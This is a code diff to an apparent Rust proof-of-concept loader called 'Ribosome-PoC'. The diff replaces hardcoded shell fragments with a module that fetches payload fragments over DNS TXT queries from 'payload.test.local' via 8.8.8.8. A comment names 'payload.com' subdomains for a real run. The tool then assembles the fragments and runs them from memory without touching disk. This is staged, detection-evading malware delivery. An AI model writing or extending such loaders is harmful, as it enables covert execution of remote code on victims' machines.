@@ -3,20 +3,21 @@ mod fragments;
 mod splicer;
 mod membrane;
 mod ribosome;
+mod network_t_rna;
 
-use fragments::{FragmentSource, InMemorySource};
+use fragments::FragmentSource;
 use splicer::Splicer;
 use membrane::Membrane;
 use ribosome::Ribosome;
+use network_t_rna::DnsTxtSource;
 
 fn main() {
-    // === Phase 1: tRNA delivery — collect fragments ===
-    let sources: Vec<InMemorySource> = vec![
-        InMemorySource { id: 0, payload: b"#!/bin/sh\n" },
-        InMemorySource { id: 1, payload: b"echo '[+] Ribosome-PoC: fileless execution from memfd'\n" },
-    ];
-
-    let mut frags: Vec<_> = sources.iter().map(|s| s.fetch()).collect();
+    // === Phase 1: tRNA delivery — collect fragments via DNS TXT ===
+    eprintln!("[*] Fetching payload fragments via DNS TXT (Port 53 UDP)...");
+    
+    // In a real scenario, this would loop over 0.payload.com, 1.payload.com, etc.
+    let dns_source = DnsTxtSource::new("payload.test.local", "8.8.8.8:53");
+    let mut frags = vec![dns_source.fetch()];
 
     // === Phase 2: Spliceosome — sort, validate, concatenate ===
     let mut payload = match Splicer::assemble(&mut frags) {
